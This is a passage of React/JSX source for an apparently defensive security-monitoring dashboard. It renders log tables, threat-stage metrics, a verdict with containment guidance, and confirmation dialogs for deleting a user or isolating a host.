                    <th style={{ padding: '10px 14px', fontWeight: '800' }}>EVENT DESCRIPTION</th>
                    <th style={{ padding: '10px 14px', fontWeight: '800', width: '240px' }}>METADATA</th>
                  </tr>
                </thead>
                <tbody>
                  {getValidatedContextualLogs().map((log) => {
                    const sev = log.contextualSeverity || log.severity || 'LOW'
                    const isCrit = sev === 'CRITICAL'
                    const isHigh = sev === 'HIGH'
                    const isMed = sev === 'MEDIUM' || sev === 'WARNING'
                    const dotColor = isCrit ? '#f6465d' : isHigh ? '#f97316' : isMed ? '#fcd535' : '#0ecb81'

                    return (
                      <tr
                        key={log.id}
                        style={{
                          borderBottom: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                          transition: 'background-color 0.15s ease',
                        }}
                        onMouseEnter={(e) => (e.currentTarget.style.backgroundColor = '#141b2a')}
                        onMouseLeave={(e) => (e.currentTarget.style.backgroundColor = 'transparent')}
                      >
                        {/* Timestamp */}
                        <td style={{ padding: '10px 14px', color: '#64748b', whiteSpace: 'nowrap' }}>
                          {log.timestamp}
                        </td>

                        {/* Severity Indicator */}
                        <td style={{ padding: '10px 14px' }}>
                          <span
                            style={{
                              display: 'inline-flex',
                              alignItems: 'center',
                              gap: '6px',
                              padding: '2px 8px',
                              borderRadius: '4px',
                              fontSize: '10px',
                              fontWeight: '800',
                              backgroundColor: `${dotColor}18`,
                              color: dotColor,
                              border: `1px solid ${dotColor}40`,
                            }}
                          >
                            <span style={{ width: '6px', height: '6px', borderRadius: '50%', backgroundColor: dotColor }} />
                            {sev}
                          </span>
                        </td>

                        {/* Event Description */}
                        <td style={{ padding: '10px 14px', color: '#e2e8f0', lineHeight: 1.4 }}>
                          {log.desc}
                        </td>

                        {/* Metadata Details */}
                        <td style={{ padding: '10px 14px', color: '#94a3b8', fontSize: '11px' }}>
                          {log.meta}
                        </td>
                      </tr>
                    )
                  })}
                </tbody>
              </table>
            </div>
          </div>
        </div>

        {/* ========================================================= */}
        {/* RIGHT COLUMN: CIPHERWATCH INSIGHT (FULL COLUMN HEIGHT)    */}
        {/* ========================================================= */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: '24px' }}>
          
          {/* CipherWatch Insight Card */}
          <div
            style={{
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: `1px solid ${socVerdict.border}`,
              borderRadius: '8px',
              padding: '24px',
              display: 'flex',
              flexDirection: 'column',
              gap: '20px',
              overflow: 'hidden',
            }}
          >
            {/* Header */}
            <div>
              <div style={{ fontSize: '11px', fontWeight: '800', color: '#fcd535', letterSpacing: '0.8px', textTransform: 'uppercase', marginBottom: '6px', display: 'flex', alignItems: 'center', gap: '8px' }}>
                <ShieldAlert size={16} color="#fcd535" />
                <span>CIPHERWATCH INSIGHT • AUTOMATED THREAT INTELLIGENCE</span>
              </div>
              <h3 style={{ margin: 0, fontSize: '17px', fontWeight: '800', color: '#ffffff', letterSpacing: '-0.3px' }}>
                Deterministic Threat Synthesis & AI Explainability
              </h3>
            </div>

            {/* Decision Engine Metrics */}
            <div
              style={{
                backgroundColor: '#0b0e14',
                border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                borderRadius: '6px',
                padding: '14px 16px',
                display: 'flex',
                flexDirection: 'column',
                gap: '12px',
              }}
            >
              <div style={{ fontSize: '10px', color: '#94a3b8', fontWeight: '800', textTransform: 'uppercase', letterSpacing: '0.8px' }}>
                DECISION ENGINE METRICS
              </div>

              <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px' }}>
                <div style={{ backgroundColor: '#121722', padding: '10px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
                  <span style={{ color: '#64748b', fontSize: '10px', fontWeight: '700', textTransform: 'uppercase' }}>Threat Pattern</span>
                  <div style={{ color: '#ffffff', fontWeight: '800', fontSize: '12px', marginTop: '3px', overflow: 'hidden', textOverflow: 'ellipsis', whiteSpace: 'nowrap' }} title={behaviorPrediction.templateName}>
                    {behaviorPrediction.templateName}
                  </div>
                </div>

                <div style={{ backgroundColor: '#121722', padding: '10px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
                  <span style={{ color: '#64748b', fontSize: '10px', fontWeight: '700', textTransform: 'uppercase' }}>Confidence Score</span>
                  <div style={{ color: '#0ecb81', fontWeight: '800', fontSize: '12px', marginTop: '3px' }}>
                    {behaviorPrediction.confidenceScore}% (High)
                  </div>
                </div>

                <div style={{ backgroundColor: '#121722', padding: '10px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
                  <span style={{ color: '#64748b', fontSize: '10px', fontWeight: '700', textTransform: 'uppercase' }}>Attack Stage</span>
                  <div style={{ color: socVerdict.color, fontWeight: '800', fontSize: '12px', marginTop: '3px' }}>
                    Stage {behaviorPrediction.currentStage} of {behaviorPrediction.totalStages}
                  </div>
                </div>

                <div style={{ backgroundColor: '#121722', padding: '10px 12px', borderRadius: '6px', border: '1px solid rgba(255,255,255,0.05)' }}>
                  <span style={{ color: '#64748b', fontSize: '10px', fontWeight: '700', textTransform: 'uppercase' }}>Composite Risk</span>
                  <div style={{ color: socVerdict.color, fontWeight: '800', fontSize: '12px', marginTop: '3px' }}>
                    {computedRisk}%
                  </div>
                </div>
              </div>

              {/* Stage Progress Bar */}
              <div style={{ marginTop: '4px' }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '10px', color: '#64748b', marginBottom: '4px', fontWeight: '700' }}>
                  <span>ATTACK PROGRESSION</span>
                  <span>{behaviorPrediction.progressPct}%</span>
                </div>
                <div style={{ height: '6px', backgroundColor: 'rgba(255,255,255,0.08)', borderRadius: '3px', overflow: 'hidden' }}>
                  <div
                    style={{
                      height: '100%',
                      width: `${behaviorPrediction.progressPct}%`,
                      backgroundColor: socVerdict.color,
                      transition: 'width 0.4s ease',
                    }}
                  />
                </div>
              </div>

              {/* Predicted Next Action */}
              <div style={{ fontSize: '11px', color: '#cbd5e1', paddingTop: '8px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                <span style={{ color: '#64748b', fontWeight: '600' }}>Predicted Next Action: </span>
                <span style={{ color: '#fcd535', fontWeight: '700' }}>{behaviorPrediction.predictedNextAction}</span>
              </div>
            </div>

            {/* Evidence Telemetry Sequence */}
            <div style={{ display: 'flex', flexDirection: 'column', gap: '10px' }}>
              <div style={{ fontSize: '10px', fontWeight: '800', color: socVerdict.color, letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                EVIDENCE TELEMETRY SEQUENCE ({getValidatedContextualLogs().length} EVENTS):
              </div>

              {getValidatedContextualLogs().slice(0, 4).map((log) => {
                const sev = log.contextualSeverity || log.severity || 'LOW'
                const isCrit = sev === 'CRITICAL'
                const isHigh = sev === 'HIGH'
                const isMed = sev === 'MEDIUM' || sev === 'WARNING'
                const sevColor = isCrit ? '#f6465d' : isHigh ? '#f97316' : isMed ? '#fcd535' : '#0ecb81'
                const formattedDesc = (log.desc || '').replace(/\/home\/[^\/]+\/Desktop\/Projects\/[^\/]+\/[^\/]+\//g, './')

                return (
                  <div
                    key={`critique-${log.id}`}
                    style={{
                      backgroundColor: '#0b0e14',
                      border: `1px solid ${sevColor}30`,
                      borderRadius: '6px',
                      padding: '10px 12px',
                      display: 'flex',
                      flexDirection: 'column',
                      gap: '4px',
                      overflow: 'hidden',
                    }}
                  >
                    <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', gap: '8px', minWidth: 0 }}>
                      <span
                        title={log.desc}
                        style={{
                          fontFamily: '"JetBrains Mono", monospace',
                          fontSize: '11px',
                          color: '#e2e8f0',
                          fontWeight: '700',
                          overflow: 'hidden',
                          textOverflow: 'ellipsis',
                          whiteSpace: 'nowrap',
                          flex: 1,
                          minWidth: 0,
                        }}
                      >
                        {formattedDesc}
                      </span>
                      <span
                        style={{
                          color: sevColor,
                          fontWeight: '900',
                          fontSize: '10px',
                          backgroundColor: `${sevColor}18`,
                          border: `1px solid ${sevColor}40`,
                          padding: '2px 6px',
                          borderRadius: '4px',
                          whiteSpace: 'nowrap',
                          flexShrink: 0,
                        }}
                      >
                        {sev}
                      </span>
                    </div>
                    <div style={{ fontSize: '10px', color: '#94a3b8', fontWeight: '500', lineHeight: 1.4 }}>
                      {getUnbiasedLogCritique(log)}
                    </div>
                  </div>
                )
              })}
            </div>

            {/* Deterministic SOC Verdict & Expanded AI Explanation */}
            <div style={{ borderTop: `1px solid ${socVerdict.border}40`, paddingTop: '16px', display: 'flex', flexDirection: 'column', gap: '12px' }}>
              <div style={{ fontSize: '10px', fontWeight: '800', color: '#64748b', letterSpacing: '0.8px', textTransform: 'uppercase' }}>
                DETERMINISTIC SOC VERDICT & ACTION
              </div>

              {/* Verdict Badge */}
              <div>
                <div
                  style={{
                    backgroundColor: socVerdict.bg,
                    border: `1px solid ${socVerdict.color}`,
                    color: socVerdict.color,
                    padding: '8px 14px',
                    borderRadius: '4px',
                    fontSize: '12px',
                    fontWeight: '800',
                    letterSpacing: '0.5px',
                    display: 'inline-flex',
                    alignItems: 'center',
                    gap: '8px',
                  }}
                >
                  <AlertOctagon size={15} color={socVerdict.color} />
                  <span>{socVerdict.verdict}</span>
                </div>
              </div>

              {/* Comprehensive AI Explanation Breakdown */}
              <div
                style={{
                  backgroundColor: '#0b0e14',
                  border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                  borderRadius: '6px',
                  padding: '14px 16px',
                  fontSize: '11px',
                  color: '#cbd5e1',
                  display: 'flex',
                  flexDirection: 'column',
                  gap: '12px',
                  lineHeight: 1.6,
                }}
              >
                <div>
                  <div style={{ color: '#fcd535', fontWeight: '800', fontSize: '12px', marginBottom: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <Info size={13} color="#fcd535" /> Behavioral Risk Rationale
                  </div>
                  Target host <strong style={{ color: '#ffffff' }}>{displayDevice}</strong> (assigned to user <strong style={{ color: '#ffffff' }}>{userName}</strong>) has reached Stage {behaviorPrediction.currentStage} of the <strong style={{ color: '#ffffff' }}>{behaviorPrediction.templateName}</strong> threat model. The backend deterministic engine calculated a composite risk posture of <strong style={{ color: socVerdict.color }}>{computedRisk}%</strong> with <strong style={{ color: '#0ecb81' }}>{behaviorPrediction.confidenceScore}%</strong> confidence.
                </div>

                <div style={{ paddingTop: '8px', borderTop: '1px solid rgba(255,255,255,0.06)' }}>
                  <div style={{ color: '#fcd535', fontWeight: '800', fontSize: '12px', marginBottom: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <Activity size={13} color="#fcd535" /> Telemetry Vector Analysis
                  </div>
                  System logs indicate an elevated sequence of process executions and filesystem operations outside baseline working hours. Observed file modifications in system staging locations indicate data aggregation prior to egress.
                </div>

                <div style={{ paddingTop: '8px', borderTop: '1px solid rgba(255,255,255,0.06)', color: '#94a3b8' }}>
                  <div style={{ color: socVerdict.color, fontWeight: '800', fontSize: '12px', marginBottom: '4px', display: 'flex', alignItems: 'center', gap: '6px' }}>
                    <ShieldAlert size={13} color={socVerdict.color} /> Containment Protocol & Guidance
                  </div>
                  <strong style={{ color: socVerdict.color }}>Recommended SOC Action:</strong> {socVerdict.action} Execute credential revocation or host isolation if risk remains unmitigated.
                </div>
              </div>
            </div>
          </div>
        </div>
      </main>

      {/* ------------------------------------------------------------- */}
      {/* 3. CONFIRMATION MODALS FOR DESTRUCTIVE ACTIONS               */}
      {/* ------------------------------------------------------------- */}
      
      {/* Delete User Confirmation Modal */}
      {showDeleteModal && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            backgroundColor: 'rgba(0, 0, 0, 0.85)',
            backdropFilter: 'blur(4px)',
            zIndex: 2000,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
          }}
          onClick={() => setShowDeleteModal(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%',
              maxWidth: '440px',
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: '1px solid rgba(246, 70, 93, 0.4)',
              borderRadius: '8px',
              padding: '28px',
              boxShadow: '0 20px 50px rgba(0, 0, 0, 0.8)',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
              <Trash2 size={20} color="#f6465d" />
              <h3 style={{ margin: 0, fontSize: '16px', color: '#ffffff', fontWeight: '800' }}>
                Confirm Endpoint Record Deletion
              </h3>
            </div>
            <p style={{ margin: '0 0 24px 0', fontSize: '13px', color: '#cbd5e1', lineHeight: 1.5 }}>
              Are you sure you want to remove user <strong>{userName}</strong> and purge enrolled telemetry logs from <strong>{currentOrg.name}</strong>?
            </p>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
              <button
                onClick={() => setShowDeleteModal(false)}
                style={{
                  backgroundColor: 'transparent',
                  border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                  color: '#cbd5e1',
                  padding: '8px 16px',
                  borderRadius: '6px',
                  fontSize: '13px',
                  fontWeight: '700',
                  cursor: 'pointer',
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmDelete}
                style={{
                  backgroundColor: '#f6465d',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 18px',
                  borderRadius: '6px',
                  fontSize: '13px',
                  fontWeight: '800',
                  cursor: 'pointer',
                }}
              >
                Confirm Delete
              </button>
            </div>
          </div>
        </div>
      )}

      {/* Suspend Access Confirmation Modal */}
      {showSuspendModal && (
        <div
          style={{
            position: 'fixed',
            inset: 0,
            backgroundColor: 'rgba(0, 0, 0, 0.85)',
            backdropFilter: 'blur(4px)',
            zIndex: 2000,
            display: 'flex',
            alignItems: 'center',
            justifyContent: 'center',
            padding: '24px',
          }}
          onClick={() => setShowSuspendModal(false)}
        >
          <div
            onClick={(e) => e.stopPropagation()}
            style={{
              width: '100%',
              maxWidth: '440px',
              backgroundColor: 'var(--colors-surface-card-dark, #121722)',
              border: '1px solid rgba(246, 70, 93, 0.5)',
              borderRadius: '8px',
              padding: '28px',
              boxShadow: '0 20px 50px rgba(0, 0, 0, 0.8)',
            }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: '10px', marginBottom: '12px' }}>
              <UserX size={20} color="#f6465d" />
              <h3 style={{ margin: 0, fontSize: '16px', color: '#ffffff', fontWeight: '800' }}>
                Confirm Host Isolation & Access Suspension
              </h3>
            </div>
            <p style={{ margin: '0 0 24px 0', fontSize: '13px', color: '#cbd5e1', lineHeight: 1.5 }}>
              Are you sure you want to suspend access and revoke API authorization for <strong>{userName}</strong>? This action enforces immediate network host isolation.
            </p>
            <div style={{ display: 'flex', justifyContent: 'flex-end', gap: '12px' }}>
              <button
                onClick={() => setShowSuspendModal(false)}
                style={{
                  backgroundColor: 'transparent',
                  border: '1px solid var(--colors-hairline-on-dark, #1e2638)',
                  color: '#cbd5e1',
                  padding: '8px 16px',
                  borderRadius: '6px',
                  fontSize: '13px',
                  fontWeight: '700',
                  cursor: 'pointer',
                }}
              >
                Cancel
              </button>
              <button
                onClick={handleConfirmSuspend}
                style={{
                  backgroundColor: '#f6465d',
                  color: '#ffffff',
                  border: 'none',
                  padding: '8px 18px',
                  borderRadius: '6px',
                  fontSize: '13px',
                  fontWeight: '800',
                  cursor: 'pointer',
                }}
              >
                Confirm Isolation
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}
